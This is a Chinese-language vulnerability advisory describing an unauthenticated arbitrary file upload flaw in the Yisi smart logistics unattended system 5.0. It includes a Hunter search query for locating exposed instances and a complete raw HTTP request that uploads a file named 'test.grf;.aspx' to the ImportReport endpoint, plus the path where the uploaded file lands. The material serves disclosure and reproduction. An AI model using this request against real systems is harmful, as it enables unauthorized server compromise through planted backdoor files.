# 易思智能物流无人值守系统ImportReport任意文件上传漏洞

# 一、漏洞简介
易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇。Sys_ReportFile/ImportReport接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

# 二、影响版本
+ 易思智能物流无人值守系统5.0

# 三、资产测绘
+ hunter`web.body=="易思无人值守智能物流"`
+ 登录页面

![1693024220415-3267a1b1-e688-4081-8abc-9bc7ee3c98f5.png](./img/b79hLMH0rZJLZ-gK/1693024220415-3267a1b1-e688-4081-8abc-9bc7ee3c98f5-749693.png)

# 四、漏洞复现
```plain
POST /Sys_ReportFile/ImportReport?encode=b HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 130
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="test.grf;.aspx"

test
--00content0boundary00--
```

---

![1693024452182-530d1309-112a-492f-939f-765a7d836023.png](./img/b79hLMH0rZJLZ-gK/1693024452182-530d1309-112a-492f-939f-765a7d836023-787469.png)

上传文件位置

```plain
http://xx.xx.xx.xx/GRF/Custom/b.aspx
```

![1693024495082-6622e59c-5e8c-4660-9a4f-d88ebac7c226.png](./img/b79hLMH0rZJLZ-gK/1693024495082-6622e59c-5e8c-4660-9a4f-d88ebac7c226-123038.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uklfg9x4h2md4vgi>